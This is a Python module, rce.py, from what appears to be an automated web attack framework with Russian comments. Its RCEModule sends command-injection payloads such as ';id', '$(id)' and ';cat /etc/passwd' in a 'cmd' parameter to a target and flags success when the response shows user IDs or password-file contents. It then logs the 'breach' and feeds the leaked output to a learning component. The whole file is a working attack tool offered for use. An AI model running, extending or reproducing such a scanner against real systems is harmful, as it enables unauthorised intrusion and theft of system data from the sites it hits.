# src/attacks/rce.py — v15.7 — ПОЛНЫЙ
import asyncio
import time
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class RCEModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or {}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {
            "attack": "rce",
            "success": False,
            "risk": 10,
            "tested_payloads": [],
            "context_snapshot": options.get("context", {}),
            "timestamp": int(time.time())
        }

        request = options.get('request')
        if not request:
            return result

        payloads = [
            ";id",
            "|whoami",
            "$(id)",
            "`id`",
            ";cat /etc/passwd"
        ]

        self.logger.info(f"RCE → {target}")

        for payload in payloads:
            result["tested_payloads"].append(payload)
            try:
                resp = await request('GET', target, params={"cmd": payload})
                if resp and ("uid=" in resp.text or "www-data" in resp.text or "root:" in resp.text):
                    result.update({
                        "success": True,
                        "vulnerable_payload": payload,
                        "data_leaked": {"output": resp.text[:500]}
                    })
                    self.logger.breach(f"RCE: {payload}")
                    if self.brain:
                        self.brain.learn("rce", target, payload, True, resp.text[:300])
                    break
            except Exception as e:
                self.logger.error(f"RCE ошибка: {e}")
                continue

        return result